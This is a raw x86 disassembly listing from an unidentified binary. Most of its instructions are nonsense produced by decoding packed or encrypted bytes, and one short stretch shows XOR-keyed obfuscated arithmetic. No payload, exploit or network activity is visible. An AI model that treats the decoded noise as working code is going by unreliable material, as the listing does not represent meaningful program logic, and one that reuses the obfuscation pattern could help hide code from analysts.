  41ea7c:	adc    BYTE PTR [ecx],bl
  41ea7e:	pop    esp
  41ea7f:	mov    ds:0x70e2dc62,al
  41ea84:	pop    es
  41ea85:	jne    0x41eaeb
  41ea87:	arpl   WORD PTR [eax],di
  41ea89:	xor    BYTE PTR [edi+0x637be782],dl
  41ea8f:	lds    edx,FWORD PTR [ebx+0x6c]
  41ea92:	mov    bl,0x1b
  41ea94:	inc    esp
  41ea95:	adc    al,0x2
  41ea97:	test   al,0xc7
  41ea99:	icebp  
  41ea9a:	popf   
  41ea9b:	and    ebx,edx
  41ea9d:	int3   
  41ea9e:	adc    bh,BYTE PTR [edx+0x6f01fbbb]
  41eaa4:	mov    cl,0xa5
  41eaa6:	xchg   bl,dh
  41eaa8:	inc    edi
  41eaa9:	push   0x39f6229
  41eaae:	xor    eax,0x62ddf34c
  41eab3:	adc    ah,BYTE PTR [edi]
  41eab5:	ror    cl,0xbc
  41eab8:	mov    ds:0x7f4460c6,eax
  41eabd:	retf   
  41eabe:	xchg   edx,eax
  41eabf:	xor    BYTE PTR [edx],al
  41eac1:	dec    eax
  41eac2:	hlt    
  41eac3:	push   cs
  41eac4:	adc    esp,DWORD PTR [esp+ecx*8+0x50]
  41eac8:	data16 cmp al,0xf1
  41eacb:	repnz mov dh,bh
  41eace:	in     al,dx
  41eacf:	dec    eax
  41ead0:	int    0xa7
  41ead2:	sar    DWORD PTR [esi+0x2cf9d05],0x62
  41ead9:	adc    ah,dl
  41eadb:	inc    ebp
  41eadc:	cs scas al,BYTE PTR es:[edi]
  41eade:	int3   
  41eadf:	sti    
  41eae0:	(bad)  
  41eae2:	aaa    
  41eae3:	mov    dh,0xfa
  41eae5:	stc    
  41eae6:	or     DWORD PTR [ebp-0x571140d7],0x5b
  41eaed:	std    
  41eaee:	adc    dh,0x5a
  41eaf1:	fist   WORD PTR [ebx]
  41eaf3:	mov    ecx,0x2fd682b0
  41eaf8:	cmp    edi,DWORD PTR [eax]
  41eafa:	or     DWORD PTR [ecx],ebp
  41eafc:	mov    ds:0xe48576fc,eax
  41eb01:	fild   QWORD PTR [ebx-0x48]
  41eb04:	sbb    edi,ebp
  41eb06:	add    ch,BYTE PTR [esi+0x19]
  41eb09:	xchg   ebp,eax
  41eb0a:	loop   0x41eb30
  41eb0c:	sub    BYTE PTR [ecx],dh
  41eb0e:	dec    ebx
  41eb0f:	mov    edi,0x829dcf38
  41eb14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb15:	push   cs
  41eb16:	mov    al,0xf3
  41eb18:	mov    al,ds:0xc9c340ff
  41eb1d:	aaa    
  41eb1e:	loope  0x41eaee
  41eb20:	out    0xfc,al
  41eb22:	or     ecx,DWORD PTR [ebx]
  41eb24:	mov    al,BYTE PTR [ebx+0x58166fea]
  41eb2a:	mov    bl,0x87
  41eb2c:	cld    
  41eb2d:	cmp    ch,dh
  41eb2f:	fs stos DWORD PTR es:[edi],eax
  41eb31:	push   es
  41eb32:	xchg   DWORD PTR [ecx+ebx*2],ecx
  41eb35:	sbb    al,0x3f
  41eb37:	cmp    BYTE PTR [esi+0x5966a7e1],0xce
  41eb3e:	addr16 push edi
  41eb40:	iret   
  41eb41:	push   edi
  41eb42:	jecxz  0x41eb89
  41eb44:	sbb    al,0x39
  41eb46:	xchg   ecx,eax
  41eb47:	mov    esp,0xafc4cace
  41eb4c:	or     BYTE PTR [ebx+ecx*2-0x364f94b7],dh
  41eb53:	fbstp  TBYTE PTR [edi-0x66]
  41eb56:	fidiv  WORD PTR [ebp+0x3d]
  41eb59:	adc    BYTE PTR [ebx+0x43],dh
  41eb5c:	dec    ecx
  41eb5d:	jns    0x41eb1f
  41eb5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb60:	adc    eax,0x70fded5
  41eb65:	arpl   WORD PTR [ecx-0x40],bp
  41eb68:	scas   al,BYTE PTR es:[edi]
  41eb69:	out    0x4a,eax
  41eb6b:	mov    cl,0x87
  41eb6d:	sub    eax,DWORD PTR [edx-0x5f]
  41eb70:	sub    eax,0x51c11102
  41eb75:	push   edi
  41eb76:	retf   
  41eb77:	lods   al,BYTE PTR ds:[esi]
  41eb78:	xchg   ebx,eax
  41eb79:	clc    
  41eb7a:	pushf  
  41eb7b:	and    dl,BYTE PTR [edi+0x77]
  41eb7e:	fcomp  DWORD PTR [edx-0x538d73e1]
  41eb84:	mov    ebx,0xb75132cf
  41eb89:	mov    dl,0x14
  41eb8b:	adc    eax,0x4663afd6
  41eb90:	xor    BYTE PTR [ebx+0x5183c039],ah
  41eb96:	sbb    al,0x7
  41eb98:	jnp    0x41eb6e
  41eb9a:	addr16 add al,0x50
  41eb9d:	inc    esp
  41eb9e:	push   ss
  41eb9f:	dec    esi
  41eba0:	rcl    BYTE PTR [ebx-0x42b08377],0xb8
  41eba7:	mov    ah,0x92
  41eba9:	and    eax,0x3344cfd4
  41ebae:	mov    bh,0x64
  41ebb0:	movsx  esi,BYTE PTR [eax-0x7]
  41ebb4:	push   ebx
  41ebb5:	xchg   esp,eax
  41ebb6:	push   ebp
  41ebb7:	sub    BYTE PTR [ebp+esi*4-0x5e115490],dh
  41ebbe:	cs icebp 
  41ebc0:	fimul  WORD PTR [eax]
  41ebc2:	in     eax,0x3b
  41ebc4:	xor    edi,esi
  41ebc6:	jecxz  0x41eb6e
  41ebc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebc9:	pop    edi
  41ebca:	pop    ebx
  41ebcb:	xchg   esi,eax
  41ebcc:	add    eax,0x5886be5a
  41ebd1:	dec    eax
  41ebd2:	adc    eax,0x1d0bc6c1
  41ebd7:	lods   al,BYTE PTR ds:[esi]
  41ebd8:	push   edx
  41ebd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebda:	xor    DWORD PTR [ecx-0x25d8de7d],ecx
  41ebe0:	fs mov edi,0xff2d98d5
  41ebe6:	in     al,0x80
  41ebe8:	mov    ebp,0x69b44eec
  41ebed:	pusha  
  41ebee:	jne    0x41ec64
  41ebf0:	xor    BYTE PTR [ecx+0x56b78fb3],cl
  41ebf6:	cmp    eax,0xaebe4d85
  41ebfb:	cmp    DWORD PTR fs:[edx-0x50f2be45],esi
  41ec02:	ins    DWORD PTR es:[edi],dx
  41ec03:	jle    0x41ec24
  41ec05:	fst    QWORD PTR [edi+0xe]
  41ec08:	inc    edi
  41ec09:	test   DWORD PTR ds:0xfaf02194,edx
  41ec0f:	jns    0x41ebbd
  41ec11:	(bad)  
  41ec12:	dec    esi
  41ec13:	pop    eax
  41ec14:	pushw  cs
  41ec16:	mov    edi,0x3a692bf7
  41ec1b:	xlat   BYTE PTR ds:[ebx]
  41ec1c:	cli    
  41ec1d:	push   edi
  41ec1e:	or     ecx,DWORD PTR [edi]
  41ec20:	inc    edi
  41ec21:	ret    0x9f8e
  41ec24:	(bad)  
  41ec25:	sub    ch,BYTE PTR [ebx+0x16]
  41ec28:	mov    ds:0x54633712,eax
  41ec2d:	loop   0x41ec0a
  41ec2f:	ss pushf 
  41ec31:	and    DWORD PTR [ebx+0x5a],edx
  41ec34:	jle    0x41ec12
  41ec36:	xor    eax,DWORD PTR [edi+0x1b]
  41ec39:	mov    ecx,0x169f9cd
  41ec3e:	scas   eax,DWORD PTR es:[edi]
  41ec3f:	adc    al,0x3e
  41ec41:	in     eax,dx
  41ec42:	in     eax,0xba
  41ec44:	cmp    eax,0xc04be19
  41ec49:	(bad)  
  41ec4a:	mov    dh,0x15
  41ec4c:	test   BYTE PTR [edi],0x23
  41ec4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec50:	loop   0x41ec48
  41ec52:	pop    ebp
  41ec53:	xor    edi,DWORD PTR [ebx+0x64]
  41ec56:	sbb    DWORD PTR [ebp-0x13b5dbdd],eax
  41ec5c:	stos   BYTE PTR es:[edi],al
  41ec5d:	retf   0xfdd4
  41ec60:	cmp    DWORD PTR [eax],esi
  41ec62:	(bad)
  41ec65:	pop    ebx
  41ec66:	sbb    eax,0xb150cb50
  41ec6b:	cmp    eax,0xdb9eb28c
  41ec70:	jecxz  0x41ecaf
  41ec72:	adc    ebx,ebp
  41ec74:	inc    esi
  41ec75:	jmp    0x4f5109e0
  41ec7a:	retf   0x7ddf
  41ec7d:	push   cs
  41ec7e:	jp     0x41ec56
  41ec80:	jmp    0x41ecfc
  41ec82:	pop    ecx
  41ec83:	aas    
  41ec84:	popa   
  41ec85:	push   esp
  41ec86:	push   esp
  41ec87:	push   edx
  41ec88:	mov    bh,0x4
  41ec8a:	mov    bl,0xa4
  41ec8c:	xchg   esi,eax
  41ec8d:	popf   
  41ec8e:	sbb    DWORD PTR ss:[esi+0x6de1643],esi
  41ec95:	push   0xc719ac13
  41ec9a:	enter  0x40,0x82
  41ec9e:	aad    0xcf
  41eca0:	mov    ch,0xd0
  41eca2:	or     eax,0x5ff0cf8e
  41eca7:	ret    0xdfc
  41ecaa:	mov    ch,0x64
  41ecac:	push   ebp
  41ecad:	xor    BYTE PTR [ebx],ch
  41ecaf:	dec    ecx
  41ecb0:	and    DWORD PTR [ebx],esi
  41ecb2:	jnp    0x41ec40
  41ecb4:	mov    ebp,0xf39b2d26
  41ecb9:	(bad)  
  41ecba:	das    
  41ecbb:	mov    DWORD PTR gs:[esi],ecx
  41ecbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecbf:	jl     0x41ecf2
  41ecc1:	arpl   WORD PTR [edi-0x6f],sp
  41ecc4:	adc    DWORD PTR [edi+0x7b],0xf997484f
  41eccb:	xor    DWORD PTR [esi+edi*8],0xdc2829e5
  41ecd2:	outs   dx,BYTE PTR ds:[esi]
  41ecd3:	push   ebx
  41ecd4:	push   esi
  41ecd5:	scas   eax,DWORD PTR es:[edi]
  41ecd6:	and    dh,BYTE PTR [edx+0x5e]
  41ecd9:	idiv   DWORD PTR [edx-0x76]
  41ecdc:	sub    BYTE PTR [ebp+0x3b55717d],cl
  41ece2:	or     DWORD PTR [esp+edx*8],0x8f4d4217
  41ece9:	cmp    ecx,DWORD PTR [edx]
  41eceb:	dec    esp
  41ecec:	xchg   ebp,eax
  41eced:	pop    ebp
  41ecee:	sub    ebx,DWORD PTR [edx]
  41ecf0:	int    0x90
  41ecf2:	inc    ebx
  41ecf3:	sub    ecx,esi
  41ecf5:	xor    ecx,eax
  41ecf7:	mov    DWORD PTR [ebp+0x8],ecx
  41ecfa:	mov    ecx,DWORD PTR [ebp+0x8]
  41ecfd:	mov    edx,DWORD PTR [ebp+0x8]
  41ed00:	imul   edx,edx,0x5708f5
  41ed06:	xor    ecx,eax
  41ed08:	add    ecx,esi
  41ed0a:	lea    ecx,[ebp+ecx*4-0x64]
  41ed0e:	mov    edi,DWORD PTR [ecx]
  41ed10:	add    edx,edi
  41ed12:	mov    DWORD PTR [ecx],edx
  41ed14:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed17:	xor    ecx,eax
  41ed19:	add    ecx,esi
  41ed1b:	jne    0x41c96c
  41ed21:	mov    ecx,DWORD PTR [ebp-0x8]
  41ed24:	mov    edx,DWORD PTR [ebp-0x20]
  41ed27:	xor    ecx,eax
  41ed29:	lea    ecx,[ecx+edx*1+0x3272db]
  41ed30:	mov    DWORD PTR [ebp-0x20],ecx
  41ed33:	inc    DWORD PTR [ebp+0xc]
  41ed36:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ed39:	xor    ecx,eax
  41ed3b:	add    ecx,esi
  41ed3d:	jne    0x41c71d
  41ed43:	jmp    0x421147
  41ed48:	mov    ecx,DWORD PTR [ebp-0xc]
  41ed4b:	mov    DWORD PTR [ebp+0x8],ecx
  41ed4e:	jmp    0x41ed80
  41ed53:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed56:	mov    edx,DWORD PTR [ebp-0x8]
  41ed59:	xor    ecx,eax
  41ed5b:	xor    edx,eax
  41ed5d:	sub    ecx,edx
  41ed5f:	sub    ecx,esi
  41ed61:	xor    ecx,eax
  41ed63:	mov    DWORD PTR [ebp+0x8],ecx
  41ed66:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed69:	mov    edx,DWORD PTR [ebp+0x8]
  41ed6c:	imul   edx,edx,0x5708f5
  41ed72:	xor    ecx,eax
  41ed74:	add    ecx,esi
  41ed76:	lea    ecx,[ebp+ecx*4-0x64]
  41ed7a:	mov    edi,DWORD PTR [ecx]
  41ed7c:	add    edx,edi
  41ed7e:	mov    DWORD PTR [ecx],edx
  41ed80:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed83:	xor    ecx,eax
  41ed85:	add    ecx,esi
  41ed87:	jne    0x41ed53
  41ed8d:	jmp    0x421153
  41ed92:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed95:	mov    edx,DWORD PTR [ebp-0x8]
  41ed98:	xor    ecx,eax
  41ed9a:	xor    edx,eax
  41ed9c:	sub    ecx,edx
  41ed9e:	sub    ecx,esi
  41eda0:	xor    ecx,eax
  41eda2:	mov    DWORD PTR [ebp+0x8],ecx
  41eda5:	mov    ecx,DWORD PTR [ebp+0x8]
  41eda8:	mov    edx,DWORD PTR [ebp+0x8]
  41edab:	xor    ecx,eax
  41edad:	imul   edx,edx,0x5708f5
  41edb3:	add    ecx,esi
  41edb5:	lea    ecx,[ebp+ecx*4-0x64]
  41edb9:	jmp    0x421134
  41edbe:	dec    ecx
  41edbf:	xor    eax,0xa7642764
  41edc4:	test   DWORD PTR [ebx],edx
  41edc6:	mov    esi,0x8be70850
  41edcb:	in     eax,dx
  41edcc:	mov    ebp,0x61da83a9
  41edd1:	bound  eax,QWORD PTR [edi+ebx*2]
  41edd4:	bound  esp,QWORD PTR [edx-0x6]
  41edd7:	popa   
  41edd8:	pop    ebp
  41edd9:	js     0x41ee2c
  41eddb:	jb     0x41ee10
  41eddd:	xchg   esp,eax
  41edde:	std    
  41eddf:	and    al,0x2d
  41ede1:	pop    ebx
  41ede2:	clc    
  41ede3:	sbb    bl,BYTE PTR [edi]
  41ede5:	test   dh,dh
  41ede7:	add    eax,0x4bb8f5d4
  41edec:	push   ebx
  41eded:	das    
  41edee:	add    esi,DWORD PTR [ecx-0x4834e145]
  41edf4:	and    ah,bh
  41edf6:	sbb    eax,0x93fde92c
  41edfb:	fisubr DWORD PTR [ebp+0x68e4e950]
  41ee01:	ja     0xdc8c698
  41ee07:	lea    edx,[eax+edi*4+0xd]
  41ee0b:	xlat   BYTE PTR ds:[ebx]
  41ee0c:	stos   BYTE PTR es:[edi],al
  41ee0d:	inc    ecx
  41ee0e:	int3   
  41ee0f:	inc    esp
  41ee10:	retf   
  41ee11:	xchg   edx,eax
  41ee12:	out    0x4e,al
  41ee14:	loope  0x41ee1b
  41ee16:	daa    
  41ee17:	imul   esi,ecx,0x11
  41ee1a:	cvtps2pi mm0,QWORD PTR [ecx-0x65cd1ea5]
  41ee21:	inc    edx
  41ee22:	pop    ebx
  41ee23:	pop    ss
  41ee24:	xchg   ebx,eax
  41ee25:	xchg   ecx,eax
  41ee26:	xchg   DWORD PTR [eax-0xb],esi
  41ee29:	inc    edx
  41ee2a:	mov    bh,0xf4
  41ee2c:	dec    esp
  41ee2d:	loope  0x41ee22
  41ee2f:	mov    bl,0x20
  41ee31:	fwait
  41ee32:	or     eax,0x52699d58
  41ee37:	(bad)  
  41ee39:	or     DWORD PTR [ecx-0x4e983407],edx
  41ee3f:	jno    0x41ee2b
  41ee41:	outs   dx,DWORD PTR ds:[esi]
  41ee42:	inc    esp
  41ee43:	ja     0x41ee39
  41ee45:	pop    esi
  41ee46:	out    0xb8,al
  41ee48:	mov    bl,BYTE PTR [eax]
  41ee4a:	jnp    0x41ee23
  41ee4c:	ja     0x41ee67
  41ee4e:	xchg   ebx,eax
  41ee4f:	popa   
  41ee50:	outs   dx,DWORD PTR ds:[esi]
  41ee51:	jae    0x41eddd
  41ee53:	mov    DWORD PTR [edi+0xb95d08b],edi
  41ee59:	idiv   BYTE PTR [edx]
  41ee5b:	dec    edx
  41ee5c:	(bad)  
  41ee5d:	push   ebx
  41ee5e:	movntq (bad),mm2
  41ee5f:	out    0xd1,eax
  41ee61:	loopne 0x41ee30
  41ee63:	fidivr DWORD PTR [esi+0x24]
  41ee66:	fldcw  WORD PTR [edx+0x8]
  41ee69:	push   ecx
  41ee6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee6b:	cmc    
  41ee6c:	rcl    DWORD PTR [ebp+0x60],0x59
  41ee70:	pushf  
  41ee71:	adc    DWORD PTR [edi-0x4b],ebp
  41ee74:	lods   al,BYTE PTR ds:[esi]
  41ee75:	stos   BYTE PTR es:[edi],al
  41ee76:	inc    ebx
  41ee77:	xlat   BYTE PTR ds:[ebx]
  41ee78:	leave  
  41ee79:	jbe    0x41eef7
  41ee7b:	xor    BYTE PTR [ebx+0x2],0x0
  41ee7f:	and    DWORD PTR [ebp+0x3f669e06],0xe8f8f14d
  41ee89:	retf   0x14a3
  41ee8c:	imul   ecx,DWORD PTR [edi+0x6],0xe
  41ee90:	mov    al,ds:0x6fadcc53
  41ee95:	retf   0xac07
  41ee98:	add    DWORD PTR [edi-0x4a],esp
  41ee9b:	push   0xcf8b4239
  41eea0:	push   ebp
  41eea1:	add    al,0xb3
  41eea3:	inc    eax
  41eea4:	inc    edx
  41eea5:	sbb    eax,0xfc8e6ac0
  41eeaa:	adc    eax,0xa8ff91e7
  41eeaf:	shl    BYTE PTR [eax+ebx*4-0x56848b63],0xff
  41eeb7:	sub    eax,0x591cf21e
  41eebc:	aaa    
  41eebd:	cs dec esp
  41eebf:	cmp    BYTE PTR [eax+0x113cd48c],bl
  41eec5:	dec    edi
  41eec6:	test   al,bh
  41eec8:	out    0x16,al
  41eeca:	xor    eax,0x4e9a5d9c
  41eecf:	cs int 0x86
  41eed2:	shl    BYTE PTR [edi+edi*4],1
  41eed5:	jecxz  0x41ee77
  41eed7:	push   ds
  41eed8:	sub    eax,DWORD PTR ds:0x55ac17b1
  41eede:	fsubr  st(6),st
  41eee0:	ins    DWORD PTR es:[edi],dx
  41eee1:	ret    0x9852
  41eee4:	aaa    
  41eee5:	leave  
  41eee6:	inc    edx
  41eee7:	lods   al,BYTE PTR ds:[esi]
  41eee8:	adc    BYTE PTR [ecx],bh
  41eeea:	xchg   DWORD PTR [esi+0x75],edx
  41eeed:	sbb    eax,DWORD PTR [ebx+0x679ce606]
  41eef3:	sbb    eax,0x1fe5a040
  41eef8:	xor    ch,BYTE PTR [esi+0x4c889a0c]
  41eefe:	inc    edi
  41eeff:	enter  0x64fd,0x9c
  41ef03:	aad    0x1b
  41ef05:	push   ds
  41ef06:	cld    
  41ef07:	pusha  
  41ef08:	mov    al,0x68
  41ef0a:	call   DWORD PTR [edi+0x7e24695a]
  41ef10:	jbe    0x41ef4a
  41ef12:	jnp    0x41ef07
  41ef14:	daa    
  41ef15:	rcl    DWORD PTR [eax],cl
  41ef17:	and    DWORD PTR [edi+0x1168f3c5],ebp
  41ef1d:	add    DWORD PTR [ebp+0x61],ecx
  41ef20:	fcmovnb st,st(4)
  41ef22:	enter  0x4711,0xd1
  41ef26:	pop    edi
  41ef27:	and    DWORD PTR [edi+0x161bab0b],edi
  41ef2d:	cmp    al,BYTE PTR [eax+eax*4]
  41ef30:	(bad)  
  41ef32:	lods   eax,DWORD PTR ds:[esi]
  41ef33:	push   esp
  41ef34:	dec    ecx
  41ef35:	or     eax,0x13f8343d
  41ef3a:	jmp    0xda0f21de
  41ef3f:	icebp  
  41ef40:	int    0xbf
  41ef42:	popa   
  41ef43:	pop    ebp
  41ef44:	jne    0x41ef31
  41ef46:	aaa    
  41ef47:	std    
  41ef48:	xchg   ecx,eax
  41ef49:	add    bh,BYTE PTR [ecx+edi*4+0x1e]
  41ef4d:	call   0xe1c4:0xc793a587
  41ef54:	js     0x41ef88
  41ef56:	daa    
  41ef57:	sub    dh,BYTE PTR [ebp-0x21]
  41ef5a:	xor    DWORD PTR [ebp+edi*4+0x5aca853],esp
  41ef61:	stos   DWORD PTR es:[edi],eax
  41ef62:	ficom  DWORD PTR ds:0x26a4f85c
  41ef68:	aas    
  41ef69:	pushf  
  41ef6a:	adc    ecx,DWORD PTR [ecx-0x56]
  41ef6d:	lea    edx,[edx-0x6b]
  41ef70:	pop    ss
  41ef71:	fild   WORD PTR [ecx+eiz*1-0x2a]
  41ef75:	jns    0x41ef9c
  41ef77:	cmp    esp,DWORD PTR [edx+0x2c72bdb1]
  41ef7d:	iret   
  41ef7e:	fisubr WORD PTR [edi-0x3c3f0add]
  41ef84:	mov    ds:0x3241509d,al
  41ef89:	or     edx,DWORD PTR [edi+ebp*8-0x78]
  41ef8d:	clc    
  41ef8e:	sbb    BYTE PTR [eax+0x6f],ch
  41ef91:	cmp    dh,BYTE PTR [esi+0x54a09b88]
  41ef97:	mov    cl,0xe8
  41ef99:	cmp    ch,BYTE PTR [ebx]
  41ef9b:	rcl    DWORD PTR [eax-0x276f0c72],0xe6
  41efa2:	mov    ebp,0x574f6443
  41efa7:	cld    
  41efa8:	lock adc DWORD PTR [ebx+ecx*2],esi
  41efac:	jge    0x41ef30
  41efae:	push   esi
  41efaf:	xor    al,0x58
  41efb1:	(bad)  
  41efb2:	and    al,ah
  41efb4:	push   ss
  41efb5:	push   edi
  41efb6:	out    0x53,al
  41efb8:	jne    0x41ef64
  41efba:	jmp    0xc61effbe
  41efbf:	sbb    edi,DWORD PTR [edx+0xc]
  41efc2:	jle    0x41eff8
  41efc4:	fldenv [ecx]
  41efc6:	test   eax,0xff002b98
  41efcb:	and    DWORD PTR [eax+0x44d4cfa6],edi
  41efd1:	pop    es
  41efd2:	int    0x34
  41efd4:	pop    eax
  41efd5:	(bad)
  41efd8:	div    DWORD PTR [ebx]
  41efda:	mov    ah,0x10
  41efdc:	mov    DWORD PTR [edx+0x49d4fbdc],ebp
  41efe2:	rcr    BYTE PTR [esi+0x6816fa4e],0x67
  41efe9:	addr16 ror ch,cl
  41efec:	leave  
  41efed:	xchg   esi,eax
  41efee:	add    eax,0xaafb63a0
  41eff3:	pop    edi
  41eff4:	and    al,BYTE PTR [esi+0x900e914]
  41effa:	imul   eax,esp,0xffffffdd
  41effd:	jle    0x41f060
  41efff:	add    eax,0xad03c1e5
  41f004:	sti    
  41f005:	and    DWORD PTR [esp+ebx*4-0x68],ebp
  41f009:	add    eax,0x28b880d4
  41f00e:	sub    bh,BYTE PTR [eax+0x68d8ff6a]
  41f014:	lods   eax,DWORD PTR ds:[esi]
  41f015:	sti    
  41f016:	ret    0x313
  41f019:	jno    0x41f03b
  41f01b:	ret    
  41f01c:	dec    edx
  41f01d:	loopne 0x41efb5
  41f01f:	fs pop esp
  41f021:	jmp    DWORD PTR [edi+0x53a7f56f]
  41f027:	fcomp  QWORD PTR [esi+0x604138e6]
  41f02d:	push   esp
  41f02e:	fisttp WORD PTR [edi+esi*2+0x4d]
  41f032:	sbb    al,0x5f
  41f034:	jne    0x41f091
  41f036:	repz and ebx,ebp
  41f039:	sar    DWORD PTR [esi-0x3b6f7103],cl
  41f03f:	outs   dx,BYTE PTR ds:[esi]
  41f040:	adc    esi,DWORD PTR [esi-0x1b110f4a]
  41f046:	test   ecx,esi
  41f048:	lock mov ebp,0xab9de91e
  41f04e:	cmp    BYTE PTR [ebp+0x6],cl
  41f051:	lahf   
  41f052:	xchg   BYTE PTR [ecx+0x43],bl
  41f055:	sbb    ah,BYTE PTR [esi]
  41f057:	test   DWORD PTR [eax+0x6976683],edi
  41f05d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f05e:	push   cs
  41f05f:	hlt    
  41f060:	stos   BYTE PTR es:[edi],al
  41f061:	mov    esi,0x54597eff
  41f066:	out    dx,al
  41f067:	sub    BYTE PTR [ecx-0x15],0xc5
  41f06b:	adc    BYTE PTR [eax-0x74],al
  41f06e:	sti    
  41f06f:	fild   QWORD PTR [eax-0x67]
  41f072:	pop    edx
  41f073:	sub    al,0x9b
  41f075:	sbb    eax,DWORD PTR [edx+0x5f0a7466]
  41f07b:	mov    DWORD PTR [edi-0x55],0x532b3937
  41f082:	mov    ds:0xe04a64db,eax
  41f087:	pop    ebx
  41f088:	add    al,0xb0
  41f08a:	loope  0x41f0b6
  41f08c:	lahf   
  41f08d:	(bad)  
  41f08e:	xchg   edx,eax
  41f08f:	aam    0xfb
  41f091:	rol    BYTE PTR [esp+edi*2],0x4d
  41f095:	push   ds
  41f096:	popf   
  41f097:	cmp    BYTE PTR [edx-0x20628424],0xa4
  41f09e:	(bad)  
  41f09f:	sbb    cl,BYTE PTR ds:0x9a0cdaf3
  41f0a5:	mov    cl,0xe5
  41f0a7:	inc    esi
  41f0a8:	jp     0x41f087
  41f0aa:	sbb    ax,0x68c8
  41f0ae:	xchg   edx,eax
  41f0af:	cmp    dh,BYTE PTR [edi+0x639e38df]
  41f0b5:	inc    edx
  41f0b6:	into   
  41f0b7:	mov    al,ds:0x33da4b92
  41f0bc:	mov    WORD PTR [ebp+0x2441725d],fs
  41f0c2:	fcmove st,st(0)
  41f0c4:	jne    0x41f050
  41f0c6:	sbb    edi,ecx
  41f0c8:	sbb    ecx,esp
  41f0ca:	cmp    dh,bl
  41f0cc:	(bad)  
  41f0cd:	je     0x41f0d1
  41f0cf:	retf   0xd42d
  41f0d2:	loopne 0x41f0ec
  41f0d4:	add    bh,bh
  41f0d6:	shl    BYTE PTR [esp+ebp*4],cl
  41f0d9:	push   edi
  41f0da:	push   ebp
  41f0db:	mov    cl,0xa9
  41f0dd:	sti    
  41f0de:	pop    ebx
  41f0df:	inc    ebp
  41f0e0:	adc    al,BYTE PTR [ebx]
  41f0e2:	jb     0x41f155
  41f0e4:	loop   0x41f0d7
  41f0e6:	cmc    
  41f0e7:	jae    0x41f168
  41f0e9:	imul   BYTE PTR [edi]
  41f0eb:	jmp    0xc33208ed
  41f0f0:	mov    ch,0x90
  41f0f2:	nop
  41f0f3:	inc    eax
  41f0f4:	or     dl,ch
  41f0f6:	popa   
  41f0f7:	push   eax
  41f0f8:	mov    bh,0xd3
  41f0fa:	mov    ebp,0xaf7c7508
  41f0ff:	xchg   esp,eax
  41f100:	out    0xa6,al
  41f102:	sti    
  41f103:	xchg   esi,eax
  41f104:	mul    BYTE PTR [ebp-0x80]
  41f107:	fnstcw WORD PTR [ebx+0x53]
  41f10a:	or     DWORD PTR [edx-0x7],ecx
  41f10d:	push   es
  41f10e:	out    dx,al
  41f10f:	js     0x41f0c9
  41f111:	add    DWORD PTR [edx+0x17],0x5b3c9a51
  41f118:	mov    ah,BYTE PTR [edx-0x439e2473]
  41f11e:	out    0xcf,al
  41f120:	or     BYTE PTR [ebx+ebp*8-0x69],ch
  41f124:	pusha  
  41f125:	in     eax,0xb0
  41f127:	or     al,0x25
  41f129:	add    eax,0x51b0036
  41f12e:	popf   
  41f12f:	in     eax,dx
  41f130:	addr16 or eax,esp
  41f133:	inc    esp
  41f134:	lods   al,BYTE PTR ds:[esi]
  41f135:	add    ecx,DWORD PTR [edx]
  41f137:	push   0x36
  41f139:	cmp    BYTE PTR [eax-0x7c30d1e8],bl
  41f13f:	lea    esp,[eax+0x28c5a7b4]
  41f145:	push   0xffffffc1
  41f147:	repnz push ebp
  41f149:	js     0x41f0e7
  41f14b:	xor    bh,BYTE PTR [ecx]
  41f14d:	xor    esp,esp
  41f14f:	rcl    BYTE PTR [edi-0x3b],0xeb
  41f153:	and    DWORD PTR [ecx-0x2b04c96b],eax
  41f159:	pop    es
  41f15a:	push   0x56
  41f15c:	inc    esp
  41f15d:	xor    al,0x89
  41f15f:	inc    edi
  41f160:	xor    edx,ecx
  41f162:	add    eax,0x287cb3ce
  41f167:	daa    
  41f168:	cwde   
  41f169:	lock fcomip st,st(4)
  41f16c:	scas   al,BYTE PTR es:[edi]
  41f16d:	adc    eax,ecx
  41f16f:	add    bl,BYTE PTR [ebp+eax*4-0x68]
  41f173:	loop   0x41f197
  41f175:	mov    WORD PTR [esi+edx*8-0x3db45dce],ds
  41f17c:	xchg   ebp,eax
  41f17d:	sub    BYTE PTR [eax],dl
  41f17f:	rol    BYTE PTR ds:0x28dff2d2,cl
  41f185:	push   eax
  41f186:	push   ss
  41f187:	or     al,0x9c
  41f189:	dec    ebx
  41f18a:	imul   BYTE PTR [ebp-0x23]
  41f18d:	jg     0x41f174
  41f18f:	fwait
  41f190:	ret    
  41f191:	pop    ds
  41f192:	dec    edx
  41f193:	pop    eax
  41f194:	mov    ch,0xa
  41f196:	adc    esi,DWORD PTR [eax+ebx*1]
  41f199:	ins    DWORD PTR es:[edi],dx
  41f19a:	pop    ds
  41f19b:	dec    esi
  41f19c:	adc    BYTE PTR [esi-0x6fc871d4],ch
  41f1a2:	pop    ebp
  41f1a4:	rcl    BYTE PTR [eax],0xe6
  41f1a7:	in     al,0x68
  41f1a9:	xor    dh,BYTE PTR [esi+0x7ee7bbf1]
  41f1af:	rcl    DWORD PTR [edi],1
  41f1b1:	lds    edx,FWORD PTR [eax+0xc]
  41f1b4:	mov    dl,0x1d
  41f1b6:	cmp    bl,bh
  41f1b8:	jle    0x41f165
  41f1ba:	adc    ah,BYTE PTR [ecx+0x648db921]
  41f1c0:	fmul   st(7),st
  41f1c2:	sbb    edi,eax
  41f1c4:	neg    DWORD PTR [edx-0x6]
  41f1c7:	mov    ch,0x57
  41f1c9:	out    0x2a,eax
  41f1cb:	repz push ecx
  41f1cd:	ins    BYTE PTR es:[edi],dx
  41f1ce:	ror    DWORD PTR [ecx-0x35],0xf7
  41f1d2:	sahf   
  41f1d3:	sbb    DWORD PTR [eax+0x51254325],ecx
  41f1d9:	jae    0x41f1f2
  41f1db:	stc    
  41f1dc:	jecxz  0x41f165
